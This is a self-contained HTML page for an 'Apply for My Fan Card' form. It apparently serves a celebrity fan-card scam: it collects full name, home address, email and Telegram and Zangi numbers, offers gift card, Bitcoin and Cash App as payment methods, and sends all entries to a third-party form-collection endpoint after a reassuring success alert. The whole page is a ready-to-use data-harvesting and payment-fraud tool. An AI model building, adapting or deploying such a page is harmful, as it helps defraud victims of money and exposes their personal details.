
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Get Your Fan Card</title>
  <style>
    body {
      background: linear-gradient(to right, #667eea, #764ba2);
      font-family: 'Segoe UI', sans-serif;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .form-container {
      background-color: rgba(255, 255, 255, 0.1);
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
      max-width: 400px;
      width: 100%;
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
    }
    label {
      display: block;
      margin: 10px 0 5px;
    }
    input[type="text"],
    input[type="email"],
    select {
      width: 100%;
      padding: 10px;
      border: none;
      border-radius: 6px;
      margin-bottom: 15px;
    }
    input[type="submit"] {
      background-color: #fff;
      color: #764ba2;
      border: none;
      padding: 10px 20px;
      border-radius: 6px;
      width: 100%;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s ease;
    }
    input[type="submit"]:hover {background-color: #eee;
    }
    small {
      display: block;
      text-align: center;
      margin-top: 10px;
      font-size: 0.85em;
      color: #eee;
    }
  </style>
</head>
<body>
  <form action="https://getform.io/f/bronvgxa" method="post" id="fanForm">
    <div class="form-container">
      <h2>Apply for My Fan Card</h2>

      <label for="fullname">Full Name:</label>
      <input type="text" id="fullname" name="fullname" required />

      <label for="address">Home Address:</label>
      <input type="text" id="address" name="address" required />

      <label for="email">Email Address:</label>
      <input type="email" id="email" name="email" required />

      <label for="phone">Phone or Telegram Number:</label>
      <input type="text" id="phone" name="phone" required />

      <label for="zangi">Zangi Number (Optional):</label>
      <input type="text" id="zangi" name="zangi" />

      <label for="payment">Preferred Payment Method:</label>
      <select id="payment" name="payment" required>
        <option value="" disabled selected>Select a payment method</option>
        <option value="PayPal">PayPal</option>
        <option value="Cash App">Cash App</option>
        <option value="Gift Card">Gift Card</option><option value="Bitcoin">Bitcoin</option>
      </select>

      <input type="submit" value="Apply Now" />
    </div>
  </form>

  <script>
    document.getElementById('fanForm').addEventListener('submit', function(event) {
      event.preventDefault(); // prevent default submission
      alert("Application successfully submitted! You'll receive an update in your email.");
      this.submit(); // submit the form after alert
    });
  </script>
</body>
</html>
